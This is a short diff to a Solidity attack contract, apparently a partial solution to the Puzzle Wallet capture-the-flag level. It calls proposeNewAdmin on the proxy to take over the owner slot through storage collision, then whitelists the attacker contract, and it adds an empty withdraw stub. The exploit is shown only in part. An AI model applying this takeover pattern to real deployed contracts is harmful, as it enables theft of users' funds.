@@ -6,6 +6,7 @@ import "./24-puzzlewallet.sol";
 contract Attack24 {
     PuzzleWallet public target;
     PuzzleProxy public proxy;
+    address public player;
 
     constructor(address payable _targetAddress) {
         target = PuzzleWallet(_targetAddress);        
@@ -13,9 +14,11 @@ contract Attack24 {
     }
 
     function attack() public {
-        // target.multicall(data);
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
+     }
+
+    function withdraw() public {
     }
 }
 
